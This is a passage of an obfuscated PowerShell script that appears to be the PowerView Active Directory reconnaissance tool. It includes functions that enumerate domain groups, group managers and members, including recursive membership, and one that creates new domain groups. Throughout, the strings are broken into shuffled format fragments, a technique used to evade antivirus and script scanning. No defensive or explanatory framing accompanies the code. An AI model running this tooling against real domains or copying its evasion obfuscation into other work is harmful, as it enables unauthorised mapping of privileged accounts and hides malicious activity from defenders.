                    elseif ($IdentityInstance.Contains('\')) {
                        $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                        if ($ConvertedIdentityInstance) {
                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                            $GroupName = $IdentityInstance.Split('\')[1]
                            $IdentityFilter += "(samAccountName=$GroupName)"
                            $SearcherArguments[("{0}{1}"-f 'Domai','n')] = $GroupDomain
                            Write-Verbose ('[Get'+'-'+'D'+'omai'+'nGroup]'+' '+'E'+'xt'+'racted'+' '+'d'+'omai'+'n '+"'$GroupDomain' "+'f'+'rom '+"'$IdentityInstance'")
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
                    }
                }

                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters[("{0}{1}{3}{2}"-f 'A','d','nt','minCou')]) {
                    Write-Verbose ("{4}{11}{5}{2}{9}{1}{6}{3}{12}{13}{10}{0}{8}{7}" -f'Co','p','G','Searchin','[Ge','n','] ','=1','unt','rou','in','t-Domai','g for ad','m')
                    $Filter += (("{3}{4}{1}{2}{0}" -f 't=1)','u','n','(','adminco'))
                }
                if ($PSBoundParameters[("{1}{2}{0}"-f 'ope','Grou','pSc')]) {
                    $GroupScopeValue = $PSBoundParameters[("{2}{1}{0}"-f 'ope','Sc','Group')]
                    $Filter = Switch ($GroupScopeValue) {
                        ("{1}{2}{3}{0}" -f 'cal','Do','ma','inLo')       { ("{0}{6}{7}{1}{4}{5}{2}{3}" -f'(gr','3556.','4',')','1.4.803',':=','oupT','ype:1.2.840.11') }
                        ("{2}{0}{3}{1}{4}" -f'otDo','ainLoca','N','m','l')    { ("{0}{4}{7}{6}{2}{1}{3}{8}{5}" -f'(!(grou','5','2.840.113','56','p',':=4))','e:1.','Typ','.1.4.803') }
                        ("{0}{1}" -f 'Glo','bal')            { ("{2}{0}{5}{7}{3}{9}{1}{4}{6}{8}" -f 'roup','113556','(g','84','.1.','Typ','4.8','e:1.2.','03:=2)','0.') }
                        ("{1}{0}"-f 'bal','NotGlo')         { (("{6}{0}{4}{5}{1}{3}{2}" -f '(','1.2.840.11355','=2))','6.1.4.803:','gr','oupType:','(!')) }
                        ("{0}{2}{1}{3}" -f 'Un','versa','i','l')         { (("{7}{0}{4}{2}{5}{6}{3}{1}" -f'T','3:=8)','2.840.','1.4.80','ype:1.','1135','56.','(group')) }
                        ("{2}{1}{0}" -f 'sal','r','NotUnive')      { ((("{8}{4}{2}{10}{3}{5}{11}{9}{6}{0}{7}{1}" -f'6.1.4.803:','))','p','2.8','upTy','40','55','=8','(!(gro','13','e:1.','.1'))) }
                    }
                    Write-Verbose ('[G'+'et-D'+'omai'+'nGroup'+'] '+'Search'+'in'+'g '+'f'+'or '+'grou'+'p '+'s'+'cop'+'e '+"'$GroupScopeValue'")
                }
                if ($PSBoundParameters[("{3}{2}{0}{1}"-f'Prope','rty','up','Gro')]) {
                    $GroupPropertyValue = $PSBoundParameters[("{2}{0}{1}" -f'op','erty','GroupPr')]
                    $Filter = Switch ($GroupPropertyValue) {
                        ("{0}{1}{2}" -f'S','ecurit','y')              { (("{10}{6}{9}{7}{0}{3}{8}{1}{4}{5}{2}"-f'1.4.8','=','83648)','0','21','474','roupTyp','40.113556.','3:','e:1.2.8','(g')) }
                        ("{0}{1}{3}{2}"-f 'Distr','i','n','butio')          { ((("{10}{2}{7}{9}{14}{4}{8}{12}{13}{1}{3}{11}{5}{6}{0}" -f '=2147483648))','6','ro','.1','.','.','803:','u','84','pT','(!(g','.4','0.','11355','ype:1.2'))) }
                        ("{2}{1}{0}"-f 'tem','edBySys','Creat')       { ("{2}{4}{1}{5}{0}{6}{3}" -f'6.1.','2.840.1','(groupType:1','803:=1)','.','1355','4.') }
                        ("{0}{3}{4}{5}{1}{2}" -f'Not','dBySyste','m','Cr','ea','te')    { ((("{5}{7}{2}{1}{3}{6}{0}{8}{4}" -f'135',':1.','oupType','2.','))','(!(','840.1','gr','56.1.4.803:=1'))) }
                    }
                    Write-Verbose ('[Get-D'+'oma'+'inG'+'ro'+'up] '+'Searc'+'h'+'ing '+'f'+'or '+'gro'+'up '+'pr'+'oper'+'ty '+"'$GroupPropertyValue'")
                }
                if ($PSBoundParameters[("{3}{2}{1}{0}"-f'r','e','DAPFilt','L')]) {
                    Write-Verbose ('[G'+'et-Domain'+'Gr'+'oup] '+'Us'+'ing '+'addi'+'tiona'+'l '+'LDAP'+' '+'fi'+'lter:'+' '+"$LDAPFilter")
                    $Filter += "$LDAPFilter"
                }

                $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
                Write-Verbose "[Get-DomainGroup] filter string: $($GroupSearcher.filter) "

                if ($PSBoundParameters[("{0}{1}" -f 'Fin','dOne')]) { $Results = $GroupSearcher.FindOne() }
                else { $Results = $GroupSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        
                        $Group = $_
                    }
                    else {
                        $Group = Convert-LDAPProperty -Properties $_.Properties
                    }
                    $Group.PSObject.TypeNames.Insert(0, ("{3}{2}{0}{1}" -f 'iew.Grou','p','rV','Powe'))
                    $Group
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose ("{3}{2}{6}{0}{4}{5}{7}{1}{8}"-f 'rror ','e','mainGro','[Get-Do','disp','osing of the ','up] E','Results obj','ct')
                    }
                }
                $GroupSearcher.dispose()
            }
        }
    }
}


function New-DomainGroup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{7}{0}{2}{10}{4}{1}{8}{9}{5}{6}"-f 'Should','r','Proce','P','sFo','ngingFuncti','ons','SUse','State','Cha','s'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}{3}"-f'o','PSS','h','uldProcess'}, '')]
    [OutputType({"{9}{0}{8}{3}{1}{5}{6}{10}{4}{7}{2}" -f't','.Ac','incipal','Services','.G','c','ountManage','roupPr','ory','Direc','ment'})]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Description,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $ContextArguments = @{
        ("{1}{0}{2}" -f 'tit','Iden','y') = $SamAccountName
    }
    if ($PSBoundParameters[("{0}{1}"-f 'Domai','n')]) { $ContextArguments[("{1}{0}{2}"-f'o','D','main')] = $Domain }
    if ($PSBoundParameters[("{0}{2}{1}{3}" -f'C','n','rede','tial')]) { $ContextArguments[("{0}{2}{1}" -f'Cre','ial','dent')] = $Credential }
    $Context = Get-PrincipalContext @ContextArguments

    if ($Context) {
        $Group = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($Context.Context)

        
        $Group.SamAccountName = $Context.Identity

        if ($PSBoundParameters[("{0}{1}"-f'N','ame')]) {
            $Group.Name = $Name
        }
        else {
            $Group.Name = $Context.Identity
        }
        if ($PSBoundParameters[("{1}{2}{0}" -f 'e','D','isplayNam')]) {
            $Group.DisplayName = $DisplayName
        }
        else {
            $Group.DisplayName = $Context.Identity
        }

        if ($PSBoundParameters[("{3}{0}{1}{2}" -f 'escr','iptio','n','D')]) {
            $Group.Description = $Description
        }

        Write-Verbose ('['+'New-Dom'+'ain'+'G'+'roup] '+'Attempti'+'n'+'g'+' '+'t'+'o '+'create'+' '+'g'+'r'+'oup '+"'$SamAccountName'")
        try {
            $Null = $Group.Save()
            Write-Verbose ('[New'+'-D'+'o'+'mainG'+'rou'+'p] '+'G'+'roup'+' '+"'$SamAccountName' "+'s'+'uccessfu'+'lly'+' '+'cre'+'at'+'ed')
            $Group
        }
        catch {
            Write-Warning ('[New-Domai'+'n'+'Gr'+'o'+'up]'+' '+'Err'+'o'+'r '+'cr'+'eatin'+'g '+'gro'+'up '+"'$SamAccountName' "+': '+"$_")
        }
    }
}


function Get-DomainManagedSecurityGroup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{2}{0}" -f 's','PSShouldP','es','roc'}, '')]
    [OutputType({"{8}{4}{7}{0}{2}{3}{1}{6}{5}"-f'w','ity','.Ma','nagedSecur','ow','oup','Gr','erVie','P'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{0}{1}" -f'N','ame'})]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f'ath','ADS','P'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{4}{1}{3}" -f'o','ntrol','D','ler','mainCo'})]
        [String]
        $Server,

        [ValidateSet({"{0}{1}"-f 'Ba','se'}, {"{0}{1}{2}" -f 'OneLev','e','l'}, {"{1}{0}"-f'ee','Subtr'})]
        [String]
        $SearchScope = ("{0}{1}" -f'Subtr','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            ("{3}{1}{0}{2}" -f'APFilte','D','r','L') = ((("{8}{4}{12}{10}{2}{6}{0}{5}{3}{11}{7}{9}{1}" -f'3556','48))','2.840.1','4.803:=2','=*)(group','.1.','1','4748','(&(managedBy','36',':1.','1','Type')))
            ("{2}{1}{0}" -f'rties','ope','Pr') = ("{9}{8}{2}{6}{7}{3}{5}{0}{4}{1}"-f'unttype,sa','ntname','stinguis','By,s','maccou','amacco','hedNam','e,managed','i','d')
        }
        if ($PSBoundParameters[("{2}{1}{0}"-f'archBase','e','S')]) { $SearcherArguments[("{0}{1}{2}" -f'Se','arch','Base')] = $SearchBase }
        if ($PSBoundParameters[("{0}{1}" -f 'Serve','r')]) { $SearcherArguments[("{0}{1}"-f 'Ser','ver')] = $Server }
        if ($PSBoundParameters[("{0}{2}{1}"-f'S','pe','earchSco')]) { $SearcherArguments[("{0}{1}{2}" -f 'Se','archSc','ope')] = $SearchScope }
        if ($PSBoundParameters[("{0}{2}{3}{1}" -f'ResultPag','e','eS','iz')]) { $SearcherArguments[("{0}{1}{3}{2}{4}" -f'Res','ultP','geSi','a','ze')] = $ResultPageSize }
        if ($PSBoundParameters[("{1}{0}{2}" -f 'verTimeLim','Ser','it')]) { $SearcherArguments[("{0}{1}{3}{4}{2}" -f'ServerTim','eL','t','im','i')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{1}{2}{3}{0}"-f'sks','Secur','i','tyMa')]) { $SearcherArguments[("{0}{1}{2}"-f 'Securi','tyMa','sks')] = $SecurityMasks }
        if ($PSBoundParameters[("{1}{2}{0}" -f 'e','Tombsto','n')]) { $SearcherArguments[("{0}{1}"-f 'Tombston','e')] = $Tombstone }
        if ($PSBoundParameters[("{0}{2}{1}"-f'C','al','redenti')]) { $SearcherArguments[("{1}{0}{2}"-f'den','Cre','tial')] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters[("{1}{0}"-f 'in','Doma')]) {
            $SearcherArguments[("{1}{2}{0}" -f'in','D','oma')] = $Domain
            $TargetDomain = $Domain
        }
        else {
            $TargetDomain = $Env:USERDNSDOMAIN
        }

        
        Get-DomainGroup @SearcherArguments | ForEach-Object {
            $SearcherArguments[("{0}{1}{2}" -f 'P','ro','perties')] = ("{5}{12}{7}{6}{0}{15}{1}{4}{11}{9}{14}{13}{8}{16}{3}{2}{17}{10}"-f 'ame','c','cts','e','ou','d',',n','edname','ame,','ttype,samac','d','n','istinguish','ntn','cou',',samac','obj','i')
            $SearcherArguments[("{1}{2}{0}" -f 'tity','Id','en')] = $_.managedBy
            $Null = $SearcherArguments.Remove(("{2}{0}{1}" -f 'DAPFi','lter','L'))

            
            
            $GroupManager = Get-DomainObject @SearcherArguments
            
            $ManagedGroup = New-Object PSObject
            $ManagedGroup | Add-Member Noteproperty ("{1}{0}" -f 'e','GroupNam') $_.samaccountname
            $ManagedGroup | Add-Member Noteproperty ("{2}{1}{3}{0}" -f'e','stinguishedNa','GroupDi','m') $_.distinguishedname
            $ManagedGroup | Add-Member Noteproperty ("{1}{0}{2}{3}" -f 'anager','M','N','ame') $GroupManager.samaccountname
            $ManagedGroup | Add-Member Noteproperty ("{2}{5}{6}{0}{1}{4}{3}"-f 'h','ed','ManagerDisting','e','Nam','u','is') $GroupManager.distinguishedName

            
            if ($GroupManager.samaccounttype -eq 0x10000000) {
                $ManagedGroup | Add-Member Noteproperty ("{1}{0}{2}{3}" -f 'ager','Man','Ty','pe') ("{0}{1}"-f 'G','roup')
            }
            elseif ($GroupManager.samaccounttype -eq 0x30000000) {
                $ManagedGroup | Add-Member Noteproperty ("{1}{2}{0}" -f'Type','Mana','ger') ("{1}{0}" -f 'r','Use')
            }

            $ACLArguments = @{
                ("{0}{1}" -f 'Iden','tity') = $_.distinguishedname
                ("{2}{0}{3}{1}" -f 'ht','ter','Rig','sFil') = ("{3}{0}{2}{1}"-f 'em','ers','b','WriteM')
            }
            if ($PSBoundParameters[("{0}{1}"-f'Serv','er')]) { $ACLArguments[("{0}{1}"-f 'Serv','er')] = $Server }
            if ($PSBoundParameters[("{0}{2}{1}" -f 'Sea','Scope','rch')]) { $ACLArguments[("{1}{2}{0}{3}" -f 'Scop','Sear','ch','e')] = $SearchScope }
            if ($PSBoundParameters[("{2}{1}{0}" -f 'geSize','Pa','Result')]) { $ACLArguments[("{2}{0}{3}{1}"-f 'ltPageSi','e','Resu','z')] = $ResultPageSize }
            if ($PSBoundParameters[("{2}{3}{1}{0}"-f'imeLimit','rT','Ser','ve')]) { $ACLArguments[("{2}{3}{1}{0}{4}"-f'eLimi','erTim','Ser','v','t')] = $ServerTimeLimit }
            if ($PSBoundParameters[("{0}{3}{1}{2}" -f'T','mbst','one','o')]) { $ACLArguments[("{1}{0}" -f 'tone','Tombs')] = $Tombstone }
            if ($PSBoundParameters[("{1}{0}{2}{3}"-f 'dent','Cre','ia','l')]) { $ACLArguments[("{0}{2}{1}" -f 'Credent','l','ia')] = $Credential }

            
            
            
            
            
            
            
            
            
            
            

            $ManagedGroup | Add-Member Noteproperty ("{2}{1}{0}" -f 'erCanWrite','g','Mana') ("{0}{2}{1}"-f'UNK','OWN','N')

            $ManagedGroup.PSObject.TypeNames.Insert(0, ("{9}{3}{0}{8}{5}{1}{4}{6}{2}{7}" -f'iew.M','ged','tyGr','V','Sec','a','uri','oup','an','Power'))
            $ManagedGroup
        }
    }
}


function Get-DomainGroupMember {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{2}{1}" -f'PS','ess','oc','ShouldPr'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{4}{0}{1}{2}{5}" -f'seDec','laredVarsMoreThanAssign','ment','P','SU','s'}, '')]
    [OutputType({"{2}{0}{1}{3}{4}{5}"-f 'ow','e','P','rView.Gr','ou','pMember'})]
    [CmdletBinding(DefaultParameterSetName = {"{1}{0}"-f 'e','Non'})]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{3}{0}{2}{1}"-f 'istinguis','e','hedNam','D'}, {"{3}{2}{0}{1}"-f 'ount','Name','c','SamAc'}, {"{1}{0}"-f'me','Na'}, {"{0}{1}{5}{3}{4}{2}{6}" -f 'M','emb','guishedN','isti','n','erD','ame'}, {"{2}{0}{1}" -f 'rNa','me','Membe'})]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(ParameterSetName = "m`A`NUALREC`URSe")]
        [Switch]
        $Recurse,

        [Parameter(ParameterSetName = "rECUrSeUs`iNg`mA`Tc`H`iNg`R`ULE")]
        [Switch]
        $RecurseUsingMatchingRule,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f 'er','ilt','F'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f'ath','P','ADS'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}{3}{4}"-f 'nContr','Do','mai','oll','er'})]
        [String]
        $Server,

        [ValidateSet({"{0}{1}" -f'Ba','se'}, {"{0}{2}{1}"-f 'OneLe','l','ve'}, {"{1}{0}" -f'ee','Subtr'})]
        [String]
        $SearchScope = ("{1}{2}{0}" -f'e','Sub','tre'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet({"{1}{0}"-f 'cl','Da'}, {"{1}{0}"-f'up','Gro'}, {"{1}{0}" -f'ne','No'}, {"{0}{1}"-f 'Owne','r'}, {"{1}{0}" -f'cl','Sa'})]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            ("{0}{2}{1}"-f 'Pro','ties','per') = ("{6}{5}{7}{9}{8}{4}{11}{3}{10}{0}{2}{1}" -f'gui','ame','shedn','e,disti','a','em','m','ber','sam',',','n','ccountnam')
        }
        if ($PSBoundParameters[("{1}{0}"-f'n','Domai')]) { $SearcherArguments[("{1}{0}"-f'ain','Dom')] = $Domain }
        if ($PSBoundParameters[("{0}{1}{2}"-f'LDAP','Filt','er')]) { $SearcherArguments[("{1}{0}{2}"-f 'lt','LDAPFi','er')] = $LDAPFilter }
        if ($PSBoundParameters[("{1}{3}{2}{0}" -f 'Base','Se','h','arc')]) { $SearcherArguments[("{0}{1}{2}" -f 'S','e','archBase')] = $SearchBase }
        if ($PSBoundParameters[("{0}{1}" -f'Ser','ver')]) { $SearcherArguments[("{1}{0}" -f 'er','Serv')] = $Server }
        if ($PSBoundParameters[("{2}{1}{0}" -f 'Scope','ch','Sear')]) { $SearcherArguments[("{2}{1}{0}" -f'hScope','arc','Se')] = $SearchScope }
        if ($PSBoundParameters[("{1}{0}{2}" -f'esultPageSi','R','ze')]) { $SearcherArguments[("{0}{2}{1}"-f'Resul','Size','tPage')] = $ResultPageSize }
        if ($PSBoundParameters[("{3}{1}{0}{4}{2}" -f 'T','er','Limit','Serv','ime')]) { $SearcherArguments[("{2}{1}{0}{3}" -f'Lim','verTime','Ser','it')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{1}{0}"-f'stone','Tomb')]) { $SearcherArguments[("{0}{1}{2}" -f 'T','om','bstone')] = $Tombstone }
        if ($PSBoundParameters[("{2}{0}{1}{3}" -f're','denti','C','al')]) { $SearcherArguments[("{1}{0}{2}"-f 'ent','Cred','ial')] = $Credential }

        $ADNameArguments = @{}
        if ($PSBoundParameters[("{1}{0}" -f 'omain','D')]) { $ADNameArguments[("{0}{2}{1}"-f'Dom','in','a')] = $Domain }
        if ($PSBoundParameters[("{2}{0}{1}"-f've','r','Ser')]) { $ADNameArguments[("{1}{0}" -f 'r','Serve')] = $Server }
        if ($PSBoundParameters[("{2}{0}{1}" -f'edentia','l','Cr')]) { $ADNameArguments[("{1}{0}{2}" -f 'denti','Cre','al')] = $Credential }
    }

    PROCESS {
        $GroupSearcher = Get-DomainSearcher @SearcherArguments
        if ($GroupSearcher) {
            if ($PSBoundParameters[("{1}{2}{5}{6}{4}{0}{7}{3}" -f 'gR','R','e','e','atchin','cur','seUsingM','ul')]) {
                $SearcherArguments[("{1}{0}" -f 'tity','Iden')] = $Identity
                $SearcherArguments['Raw'] = $True
                $Group = Get-DomainGroup @SearcherArguments

                if (-not $Group) {
                    Write-Warning ('[Get'+'-D'+'omai'+'nGroupMemb'+'er]'+' '+'E'+'rr'+'or '+'s'+'ea'+'rching '+'for'+' '+'gro'+'up '+'wi'+'th '+'i'+'denti'+'ty: '+"$Identity")
                }
                else {
                    $GroupFoundName = $Group.properties.item(("{0}{1}{2}{3}" -f 'sa','m','accountn','ame'))[0]
                    $GroupFoundDN = $Group.properties.item(("{3}{1}{2}{4}{0}" -f 'e','sti','nguished','di','nam'))[0]

                    if ($PSBoundParameters[("{1}{0}"-f'n','Domai')]) {
                        $GroupFoundDomain = $Domain
                    }
                    else {
                        
                        if ($GroupFoundDN) {
                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    Write-Verbose ('[Get-Do'+'mainGroupMem'+'b'+'er'+'] '+'Us'+'ing '+'LDA'+'P '+'matc'+'h'+'ing '+'r'+'ule '+'t'+'o '+'recu'+'rse '+'on'+' '+"'$GroupFoundDN', "+'onl'+'y '+'us'+'er '+'acc'+'ounts '+'wil'+'l '+'be'+' '+'ret'+'urn'+'ed.')
                    $GroupSearcher.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupFoundDN))"
                    $GroupSearcher.PropertiesToLoad.AddRange((("{1}{2}{4}{3}{0}"-f 'dName','distingu','i','e','sh')))
                    $Members = $GroupSearcher.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
                }
                $Null = $SearcherArguments.Remove('Raw')
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($IdentityInstance -match ("{0}{1}"-f'^S-1','-')) {
                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                    }
                    elseif ($IdentityInstance -match ("{0}{1}" -f'^C','N=')) {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters[("{0}{1}" -f'Do','main')]) -and (-not $PSBoundParameters[("{0}{1}{3}{2}"-f'Se','a','chBase','r')])) {
                            
                            
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose ('[Ge'+'t-Dom'+'ainG'+'r'+'ou'+'pMemb'+'er] '+'E'+'x'+'t'+'racted '+'dom'+'ain '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                            $SearcherArguments[("{1}{0}" -f'omain','D')] = $IdentityDomain
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GroupSearcher) {
                                Write-Warning ('[Get'+'-Do'+'m'+'ainG'+'r'+'oupMemb'+'er] '+'Unabl'+'e '+'t'+'o '+'r'+'etrieve'+' '+'do'+'ma'+'in '+'s'+'earch'+'er '+'f'+'or '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    elseif ($IdentityInstance.Contains('\')) {
                        $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                        if ($ConvertedIdentityInstance) {
                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                            $GroupName = $IdentityInstance.Split('\')[1]
                            $IdentityFilter += "(samAccountName=$GroupName)"
                            $SearcherArguments[("{1}{0}" -f 'ain','Dom')] = $GroupDomain
                            Write-Verbose ('[G'+'et'+'-DomainGr'+'oupMe'+'m'+'b'+'er] '+'Ext'+'ra'+'cted'+' '+'do'+'ma'+'in '+"'$GroupDomain' "+'fr'+'om '+"'$IdentityInstance'")
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        $IdentityFilter += "(samAccountName=$IdentityInstance)"
                    }
                }

                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters[("{2}{0}{1}" -f'Filte','r','LDAP')]) {
                    Write-Verbose ('[Get-Do'+'ma'+'inGrou'+'pM'+'ember'+'] '+'Us'+'ing'+' '+'ad'+'ditional'+' '+'LDA'+'P '+'f'+'ilt'+'er: '+"$LDAPFilter")
                    $Filter += "$LDAPFilter"
                }

                $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
                Write-Verbose "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $($GroupSearcher.filter) "
                try {
                    $Result = $GroupSearcher.FindOne()
                }
                catch {
                    Write-Warning ('[Get-Dom'+'a'+'i'+'nGroupMe'+'m'+'ber]'+' '+'E'+'rror '+'sea'+'rc'+'hing '+'for'+' '+'g'+'roup '+'wi'+'th '+'i'+'denti'+'ty '+"'$Identity': "+"$_")
                    $Members = @()
                }

                $GroupFoundName = ''
                $GroupFoundDN = ''

                if ($Result) {
                    $Members = $Result.properties.item(("{0}{1}" -f'memb','er'))

                    if ($Members.count -eq 0) {
                        
                        $Finished = $False
                        $Bottom = 0
                        $Top = 0

                        while (-not $Finished) {
                            $Top = $Bottom + 1499
                            $MemberRange="member;range=$Bottom-$Top"
                            $Bottom += 1500
                            $Null = $GroupSearcher.PropertiesToLoad.Clear()
                            $Null = $GroupSearcher.PropertiesToLoad.Add("$MemberRange")
                            $Null = $GroupSearcher.PropertiesToLoad.Add(("{1}{2}{0}"-f 'ame','samacc','ountn'))
                            $Null = $GroupSearcher.PropertiesToLoad.Add(("{1}{3}{2}{0}" -f 'uishedname','dis','ng','ti'))

                            try {
                                $Result = $GroupSearcher.FindOne()
                                $RangedProperty = $Result.Properties.PropertyNames -like ("{4}{0}{3}{2}{1}"-f'e','ge=*',';ran','mber','m')
                                $Members += $Result.Properties.item($RangedProperty)
                                $GroupFoundName = $Result.properties.item(("{1}{0}{4}{3}{2}"-f'ma','sa','e','untnam','cco'))[0]
                                $GroupFoundDN = $Result.properties.item(("{3}{2}{1}{0}"-f'ame','shedn','gui','distin'))[0]

                                if ($Members.count -eq 0) {
                                    $Finished = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $Finished = $True
                            }
                        }
                    }
                    else {
                        $GroupFoundName = $Result.properties.item(("{3}{2}{0}{1}" -f'ount','name','acc','sam'))[0]
                        $GroupFoundDN = $Result.properties.item(("{4}{1}{5}{2}{0}{3}"-f'dnam','s','nguishe','e','di','ti'))[0]
                        $Members += $Result.Properties.item($RangedProperty)
                    }

                    if ($PSBoundParameters[("{0}{1}"-f 'Doma','in')]) {
                        $GroupFoundDomain = $Domain
                    }
                    else {
                        
                        if ($GroupFoundDN) {
                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }

            ForEach ($Member in $Members) {
                if ($Recurse -and $UseMatchingRule) {
                    $Properties = $_.Properties
                }
                else {
                    $ObjectSearcherArguments = $SearcherArguments.Clone()
                    $ObjectSearcherArguments[("{2}{0}{1}"-f 'enti','ty','Id')] = $Member
                    $ObjectSearcherArguments['Raw'] = $True
                    $ObjectSearcherArguments[("{2}{0}{1}" -f 'roperti','es','P')] = ("{5}{4}{8}{6}{1}{2}{9}{0}{3}{7}{10}"-f'b','na','me,c','jectsi','tingu','dis','d','d','ishe','n,samaccountname,o',',objectclass')
                    $Object = Get-DomainObject @ObjectSearcherArguments
                    $Properties = $Object.Properties
                }

                if ($Properties) {
                    $GroupMember = New-Object PSObject
                    $GroupMember | Add-Member Noteproperty ("{1}{2}{0}" -f'pDomain','Gro','u') $GroupFoundDomain
                    $GroupMember | Add-Member Noteproperty ("{1}{0}{3}{2}"-f 'r','G','e','oupNam') $GroupFoundName
                    $GroupMember | Add-Member Noteproperty ("{2}{4}{5}{3}{0}{1}" -f 'dN','ame','G','guishe','roupDisti','n') $GroupFoundDN

                    if ($Properties.objectsid) {
                        $MemberSID = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectsid[0], 0).Value)
                    }
                    else {
                        $MemberSID = $Null
                    }

                    try {
                        $MemberDN = $Properties.distinguishedname[0]
                        if ($MemberDN -match ((("{3}{6}{9}{4}{7}{8}{0}{2}{5}{1}"-f 'cipa','-1-5-21','ls','F','curityP','VqzS','oreig','r','in','nSe'))  -replaCE'Vqz',[CHAr]124)) {
                            try {
                                if (-not $MemberSID) {
                                    $MemberSID = $Properties.cn[0]
                                }
                                $MemberSimpleName = Convert-ADName -Identity $MemberSID -OutputType ("{2}{1}{0}"-f'imple','omainS','D') @ADNameArguments

                                if ($MemberSimpleName) {
                                    $MemberDomain = $MemberSimpleName.Split('@')[1]
                                }
                                else {
                                    Write-Warning ('[Get-'+'Dom'+'ain'+'G'+'r'+'oupMember]'+' '+'E'+'rror'+' '+'con'+'verti'+'n'+'g '+"$MemberDN")
                                    $MemberDomain = $Null
                                }
                            }
                            catch {
